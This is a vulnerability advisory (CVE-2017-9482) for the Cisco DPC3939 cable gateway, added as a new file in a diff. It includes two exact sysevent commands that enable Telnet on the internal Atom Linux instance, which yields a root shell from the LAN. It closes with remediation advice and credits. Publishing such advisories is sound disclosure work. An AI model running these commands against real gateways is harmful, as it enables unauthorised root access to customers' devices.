@@ -1,0 +1,50 @@
+Bastille Tracking Number 25
+CVE-2017-9482
+
+Overview
+
+A vulnerability has been discovered that enables an attacker to gain a root shell to the network processor (Atom) Linux instance of a gateway.
+
+
+
+Affected Platforms
+
+Cisco DPC3939, firmware version dpc3939-P20-18-v303r20421746-170221a-CMCST
+
+
+
+Proof-of-Concept
+
+An attacker with the ability to launch applications on a gateway (Bastille Tracking Number 22) can enable Telnet on the internal IP address of the NP (Atom) Linux instance as follows:
+
+sysevent --port 52367 --ip 10.0.0.1 async eRT /fss/gw/usr/ccsp/dmcli Device.WiFi.X_CISCO_COM_EnableTelnet bool true
+sysevent --port 52367 --ip 10.0.0.1 set eRT setv
+
+After running the above commands, a Telnet server is running on 169.254.101.2, which is normally inaccessible to clients on the LAN, however this can be routed to via 10.0.0.254 (Bastille Tracking Number 24).
+
+An attacker can then gain a root shell on the NP (Atom) Linux instance from the LAN or private Wi-Fi AP.
+
+
+
+Test Environment
+
+Cisco DPC3939, firmware version dpc3939-P20-18-v303r20421746-170221a-CMCST
+
+
+
+Mitigation
+
+There is no apparent mechanism to allow Comcast customers to prevent access to the NP internal IP address or control the Telnet server.
+
+
+
+Recommended Remediation
+
+Update the firewall rules to prevent access to the NP internal IP address from the LAN.
+
+
+
+Credits
+
+Marc Newlin and Logan Lamb, Bastille
+Chris Grayson, Web Sight.IO
